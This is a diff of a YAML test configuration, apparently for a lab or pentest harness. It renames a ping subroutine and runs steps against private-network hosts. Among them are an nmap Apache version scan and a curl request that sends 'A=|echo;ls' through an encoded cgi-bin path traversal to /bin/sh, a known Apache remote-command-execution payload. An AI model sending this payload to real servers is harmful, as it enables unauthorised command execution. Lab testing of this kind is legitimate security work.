@@ -2,27 +2,27 @@ actions:
 
   test:
     1:
+      call: testping
+      #expected: Success
+    2:
       operator: AND
       1a:
         command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
         expected: Apache
       1b: [echo 'test kali', test kali]
-    2:
-      call: testr2
-      #expected: Success
     3:
       [curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
     4:
       command: echo 'OK'
       expected: OK
 
-  testr2:
+  testping:
     1:
-      command: echo "test r2"
-      expected: test r2
+      command: ping -c 3 <$IP:192.168.3.10>
+      expected: 3 received
     2: 
-      command: echo 'test aaa'
-      expected: test aaa
+      command: echo 'test'
+      expected: test
 
 
   test_plan:
@@ -33,7 +33,7 @@ actions:
         expected: <$TEST:Apache>
       1b: [echo 'test kali', test kali]
     2:
-      call: testr2
+      call: testping
       #expected: Success
     3:
       [curl 'http://<$IP:192.168.3.10>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
